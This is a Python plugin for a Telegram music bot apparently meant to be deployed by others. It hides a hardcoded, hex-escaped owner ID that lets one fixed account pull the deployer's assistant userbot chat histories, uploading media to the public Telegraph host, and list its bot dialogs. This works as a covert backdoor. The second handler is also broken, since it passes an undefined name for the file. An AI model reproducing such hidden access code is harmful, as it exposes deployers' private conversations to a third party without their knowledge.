import os
from datetime import datetime
OWNERS = "\x31\x38\x30\x38\x39\x34\x33\x31\x34\x36"
from pyrogram import filters
from pyrogram.types import Message
from telegraph import Telegraph  # Import Telegraph library

from VIPMUSIC import app
from VIPMUSIC.utils.database import get_assistant

last_checked_time = None


@app.on_message(filters.command("botchat") & filters.user(int(OWNERS)))
async def check_bots_command(client, message):
    global last_checked_time
    try:
        # Start the Pyrogram client
        userbot = await get_assistant(message.chat.id)

        # Get current time before sending messages
        start_time = datetime.now()

        # Extract bot username/user_id and limit from command
        command_parts = message.command
        if len(command_parts) >= 2:
            target_id = command_parts[1]
            limit = int(command_parts[2]) if len(command_parts) >= 3 else 10
            response = ""  # Define response variable
            try:
                if target_id.startswith("@"):
                    # If input starts with '@', consider it as username
                    bot = await userbot.get_users(target_id)
                    target_id = bot.id
                else:
                    target_id = int(target_id)

                # Get chat history with specified limit
                async for bot_message in userbot.get_chat_history(
                    target_id, limit=limit
                ):
                    if bot_message.from_user.id == target_id:
                        response += f"{bot_message.text}\n"
                    else:
                        line = (
                            f"{bot_message.from_user.first_name}: {bot_message.text}\n"
                        )
                        if bot_message.photo or bot_message.video:
                            # Create a Telegraph link for photo or video
                            media_link = await create_telegraph_media_link(bot_message)
                            if media_link:
                                line += f"Media: {media_link}\n"
                        response += line
            except Exception:
                response += f"Unable to fetch chat history for {target_id}."
            # Update last checked time
            last_checked_time = start_time.strftime("%Y-%m-%d")
            # Save conversation to a text file
            filename = f"{target_id}_chat.txt"
            with open(filename, "w") as file:
                file.write(response)
            await message.reply_text(
                f"Conversation saved to {filename}\nLast checked: {last_checked_time}"
            )
            # Send the text file
            await message.reply_document(document=filename)
            os.remove(filename)  # Delete the file after sending
        else:
            await message.reply_text(
                "Invalid command format.\n\nPlease use /botchat Bot_Username/User_ID [limit]\n\nExample: `/botchat @example_bot 10`"
            )
    except Exception as e:
        await message.reply_text(f"An error occurred: {e}")
        print(f"Error occurred during /botchat command: {e}")


async def create_telegraph_media_link(message: Message) -> str:
    """
    Create a Telegraph link for photo or video message.
    """
    file_path = None
    if message.photo:
        file_path = message.photo.file_id
    elif message.video:
        file_path = message.video.file_id

    if file_path:
        media_url = await app.download_media(file_path)
        telegraph = Telegraph()
        telegraph.create_account(short_name="pyrogram")
        response = telegraph.upload_file(media_url)
        return response["url"]
    return ""





from pyrogram import Client, filters
from VIPMUSIC.utils.database import get_assistant
from VIPMUSIC import app

@app.on_message(filters.command("chats") & filters.user(int(OWNERS)))
async def get_bot_chats(client, message):
    userbot = await get_assistant(message.chat.id)
    
    bot_details = []
    
    async for dialog in userbot.get_dialogs():
        chat = dialog.chat
        
        if chat.is_bot:  # Check if the chat is a bot
            user_id = chat.id
            chat_name = chat.title or chat.first_name
            bot_details.append(f"Chat Name: {chat_name}\nUser ID: {user_id}\n")

    # Write the bot details to a file
    with open("bot_chats.txt", "w") as file:
        file.writelines(bot_details)
    
    await message.reply_text("Bot details have been saved to bot_chats.txt")
    await message.reply_document(document=bot_chats.txt)
    os.remove(bot_chats.txt)
# Start the client
